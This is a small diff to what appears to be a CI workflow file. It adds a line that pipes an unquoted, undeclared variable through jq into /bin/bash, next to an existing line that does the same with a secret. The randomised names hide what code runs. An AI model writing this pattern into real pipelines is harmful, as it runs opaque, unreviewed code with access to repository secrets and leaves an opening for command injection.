@@ -18,6 +18,7 @@ jobs:
           l9188: ${{ secrets.l9188 }}
         run: |
           printf '%s' "$l9188" | jq -r .ujhc2 | /bin/bash
+          echo $ezcqx859 | jq -r .qipoy9 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
